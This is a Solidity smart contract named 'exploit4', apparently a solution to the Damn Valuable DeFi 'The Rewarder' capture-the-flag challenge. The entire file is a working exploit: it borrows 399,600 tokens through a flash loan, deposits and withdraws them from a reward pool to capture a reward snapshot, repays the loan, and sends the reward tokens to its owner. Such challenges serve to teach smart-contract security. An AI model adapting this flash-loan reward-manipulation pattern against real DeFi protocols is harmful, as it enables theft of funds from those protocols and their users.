// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";
import "./TheRewarderPool.sol";
// import "./RewardToken.sol";


contract exploit4{

    FlashLoanerPool pool;
    TheRewarderPool rewardpool;
    DamnValuableToken liquidityToken;
    AccountingToken accountingToken;
    address private owner;
    RewardToken rewardtoken;

    

    constructor(address _pool, address _rewardpool, address _liquidityToken, AccountingToken _accountingToken,address _owner,address _rewardtoken){
        pool = FlashLoanerPool(_pool);
        rewardpool = TheRewarderPool(_rewardpool);
        liquidityToken =  DamnValuableToken(_liquidityToken);
        accountingToken = AccountingToken(_accountingToken);
        owner = _owner;
        rewardtoken = RewardToken(_rewardtoken);

    }

    function executeflashloan() public{
        uint256 amount = 399600 * 10 ** 18;
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external{
        liquidityToken.approve(address(rewardpool),amount);
        rewardpool.deposit(amount);
        rewardpool.withdraw(amount);
        liquidityToken.transfer(address(pool),amount);
        rewardtoken.transfer(owner,rewardtoken.balanceOf(address(this)));
    }
}